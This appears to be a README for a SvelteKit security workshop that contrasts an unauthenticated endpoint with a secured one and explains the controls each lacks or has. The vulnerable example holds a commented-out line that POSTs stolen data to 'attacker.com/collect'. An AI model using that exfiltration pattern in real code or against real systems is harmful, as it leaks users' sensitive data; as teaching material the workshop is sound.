# SvelteKit Security Workshop

This workshop demonstrates the importance of securing your SvelteKit
endpoints by showing both vulnerable and secure implementations.

## Vulnerable Example ⚠️

The following code demonstrates how easily an attacker can steal
sensitive data from an unsecured endpoint. Paste this into your
browser console:

```js
fetch('/api/vulnerable-sensitive')
	.then((r) => r.json())
	.then((data) => {
		console.log('Stolen data:', data);
		// In a real attack, data could be sent to attacker's server:
		// fetch('https://attacker.com/collect', {
		//     method: 'POST',
		//     body: JSON.stringify(data)
		// });
	});
```

This vulnerable endpoint (`/api/vulnerable-sensitive`) has several
security issues:

1. No authentication check - anyone can access it
2. No authorization check - no role/permission verification
3. Exposes sensitive data directly (API keys, passwords, etc.)
4. No rate limiting to prevent abuse
5. No audit logging of access attempts

## Secure Example ✅

Here's how the same endpoint should be properly secured
(`/api/sensitive`):

```js
// This will fail as expected due to security measures
fetch('/api/sensitive')
	.then((r) => r.json())
	.then((data) => console.log('Data:', data))
	.catch((err) => console.error('Access denied:', err));
```

The secure endpoint implements critical security measures:

1. Authentication check - requires valid user session
2. Authorization check - requires admin role
3. Data filtering - removes sensitive fields before sending
4. Rate limiting - prevents brute force attempts
5. Audit logging - tracks access attempts
6. Proper error handling - doesn't leak implementation details

Always implement proper security measures in your SvelteKit
applications to protect sensitive data!
